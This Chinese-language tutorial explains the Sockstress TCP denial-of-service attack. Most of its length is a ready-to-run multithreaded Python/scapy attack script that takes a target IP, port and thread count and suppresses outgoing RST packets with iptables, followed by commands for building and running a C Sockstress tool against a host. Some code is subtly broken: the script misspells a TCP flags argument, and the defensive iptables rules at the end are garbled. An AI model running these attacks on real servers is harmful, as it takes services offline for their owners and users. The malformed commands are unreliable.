
# Sockstress攻击

* 简介
* 脚本攻击
* 防御措施

## 简介
* 2008年由Jack C.Louis 发现
* 针对TCP服务的拒绝服务攻击
    * 消耗被攻击目标系统资源
    * 与攻击目标建立大量socket链接
    * 完成三次握手，最后的ACK包window 大小为0 (客户端不接收数据)
    * 攻击者资源消耗小(CPU、内存、带宽)
    * 异步攻击，单机可拒绝服务高配资源服务器
    * Window 窗口实现的TCP 流控

## 脚本攻击
* python 测试脚本
``` 
#!/usr/bin/python
#coding=utf-8

from scapy.all import*
from time import sleep
import thread
import random
import logging
import os
import signal
import sys
import signal

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print "用法: ./sockstress.py [IP地址] [端口] [线程数]"
    print "举例: ../sockstress.py  1.1.1.1 80 20 # 请确定被攻击端口处于开放状态"
    sys.exit()

target = str(sys.argv[1])
dstport= int(sys.argv[2])
threads = int(sys.argv[3])

## 攻击函数
def sockstress(target,dstport) :
    while 0 == 0:
        try:
            x = random.randint(0,65535)
            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags = 'S'),timeout=1,verbose=0)
            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,lags='A',ack=(response[TCP].seq + 1) )/'\x00\x00',verbose=0)
        except:
            pass

## 停止攻击函数
def shutdown(signal,frame):
    print "正在修复 iptables 规则"
    os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -d '+ target +' -j DROP')
    sys.exit()

## 添加iptables规则
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '+ target +' -j DROP')
signal.signal(signal.SIGINT, shutdown)

## 多线程攻击
print "\n攻击正在进行...按 Ctrl+C 停止攻击"
for x in range(0,threads):
    thread.start_new_thread(sockstress, (target,dstport))

##永远执行
while 0 == 0:
    sleep(1)

```


``` 
# 查看系统连接数
netstat | grep ESTABLISHED | wc -l

```

*  C 攻击脚本
> https://github.com/defuse/sockstress

``` 
gcc -Wall -c sockstress.c
gcc -pthread -o sockstress sockstress.o
./sockstress 10.10.10.132:80 eth0
./sockstress 10.10.10.132:80 eth0 -p payloads/http

防火墙规则
iptables -A OUTPUT -p TCP --tcp-flags rst rst -d 10.10.10.132 -j DROP

```

``` 
查看攻击效果
netstat -tulnp | grep ESTABLISHED | wc -l
free
top

```

## 防御措施
1. 直到今天sockstress攻击仍然是一种很有效的DOS攻击方式
1. 由于建立完整的TCP三步握手，因此使用syn cookie防御无效
1. 根本的防御方法是采用白名单(不实际)
1. 折中对策限制单位时间内每IP建的TCP连接数
1. 封杀每30秒与 80 端口建立连接超过 10 个的IP地址
```  
iptables -I INPUT -p tcp –dport 80 -m state–state NEW -m recent–set
iptables -I INPUT-p tcp -dport 80 -m state-state NEW-m recent -update–seconds 30 -hitcount 10 j DROP
以上规则对DDOS攻击无效
```
